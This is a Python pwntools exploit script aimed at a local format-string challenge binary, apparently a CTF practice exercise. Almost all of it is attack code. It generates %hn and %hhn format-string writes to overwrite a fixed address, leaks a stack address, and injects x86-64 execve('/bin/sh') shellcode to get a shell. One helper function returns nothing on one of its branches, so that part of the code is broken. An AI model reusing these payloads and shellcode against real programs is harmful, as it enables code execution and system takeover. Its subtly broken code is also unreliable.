from pwn import *

import time

target = process("./chall-test_fmtString-26-x64")
gdb.attach(target, gdbscript="verify_exploit")

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

def genFodder(size):
	return size*"0"

def getBytesAt(value, offset, size):
	value = value >> (offset * 8)
	i = 0
	retValue = 0
	while size != 0:
		currentByte = (value & 0xff)
		value = value >> 8
		size -= 1
		currentByte = currentByte << (8*i)
		retValue = retValue | currentByte
		i += 1
	return retValue

def getStartingFmtStringOffsetsx64(positionOffset, bytesWritten, stackOffset):
	if positionOffset != 8:
		beginString = genFodder(positionOffset)
		bytesWritten += positionOffset
		stackOffset += 1
	else:
		beginString = ""
		return beginString, bytesWritten, stackOffset

def getAddressesx64(writeSizes, address):
	addresses = []
	bytesWritten = 0
	for i in range(0, len(writeSizes)):
		addresses.append(p64(address + bytesWritten))
		bytesWritten += writeSizes[i]
	return addresses

def getx64WriteSizes(value):
	writeSize = getIntSizeBytes(value)
	writeSizes = [2]*(int(writeSize / 2))
	if (writeSize % 2) != 0:
		writeSizes.append(1)
	return writeSizes

def getValuesx64(numWrites, writeSizes, value):
	values = []
	writtenBytes = 0
	for i in range(0, numWrites):
		values.append(getBytesAt(value, writtenBytes, writeSizes[i]))
		writtenBytes += writeSizes[i]
	return values

def writePrintSizesx64(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
	for i in range(0, numWrites):
		printSize = getWriteSize(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{size}c".format(size = printSize))
	return printSizes

def writeWritesx64(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	writes = []
	stackOffset += int(fmtStrSize / 8)
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getLargestFmtStrSizex64(value):
	numBytes = getIntSizeBytes(value)
	if numBytes == 1:
		return 0x10

	elif numBytes == 2:
		return 0x10

	elif numBytes == 3:
		return 0x20

	elif numBytes == 4:
		return 0x20

	elif numBytes == 5:
		return 0x30

	elif numBytes == 6:
		return 0x30

	elif numBytes == 7:
		return 0x40

	elif numBytes == 8:
		return 0x40

def generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize):
	payload = ""
	for i in range(0, numWrites):
		payload += printValues[i]
		payload += writes[i]
	payload += "0"*(fmtStrSize - len(payload))
	for i in range(0, numWrites):
		payload += addresses[i]
	return payload
def getPrintSizesx64ZeroOut(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
	for i in range(0, numWrites):
		if values[i] == 0x0:
			printSize = 0x10000 - (bytesWritten & 0xffff)
			printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
			bytesWritten += printSize
			continue
		printSize = getWriteSizeShort(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
	return printSizes
def getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	stackOffset += int(fmtStrSize / 8)
	writes = []
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getWriteSizeShort(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted
	else:
		writeSize = 2
		overflowInt = getOverflowInt(writeSize)
		targetValue = overflowInt + writeValue
		andInt = get0fInt(writeSize)
		valuePrinted = targetValue - (writtenValue & 0xffff)
		return valuePrinted
address = 0x403398
address0 = p64(address + 0x0)
address1 = p64(address + 0x2)
# The value we are trying to write
value = 0x401257

# The print value size, to control the value being written
print0 = "%4695c"
print1 = "%233c"

# Specify the offset to the address, and write to it
write0 = "%10$hn"
write1 = "%11$hhn"

# Form the payload
payload = ""
payload += print0
payload += write0
payload += print1
payload += write1
payload += "0"*(0x20 - len(payload))
payload += address0
payload += address1

# Send the fmt string payload
target.sendline(payload)
leakPayload = ""
leakPayload += "xxxxxxx"
leakPayload += "%1$lx"
leakPayload += "yyyyyyy"
leakPayload += "0"*(22 - len(leakPayload))
leakPayload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
target.sendline(leakPayload)
leak = target.recvuntil("yyyyyyy")
leak = leak.strip("yyyyyyy")
leak = leak.split("xxxxxxx")[1]
leak = int(leak, 0x10)

retAddress = leak + 0x8
inputAddress = retAddress - 0x208
print("Return Address is: %s" % hex(retAddress))
print("Input  Address is: %s" % hex(inputAddress))

stackOffset = 6
bytesOffset = 0
positionOffset = 8


value = inputAddress + 22

address = 0x403398

writeSizes = [2, 2, 2, 2]
numWrites = 4
fmtStrSize = 0x40
addresses = getAddressesx64(writeSizes, address)

values = getValuesx64(numWrites, writeSizes, value)

beginString, bytesWritten, stackOffset = getStartingFmtStringOffsetsx64(positionOffset, bytesOffset, stackOffset)

printValues = getPrintSizesx64ZeroOut(numWrites, values, bytesWritten)

writes = getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize)

payload = generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize)

payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
target.sendline(payload)
target.recvall(timeout = 2)
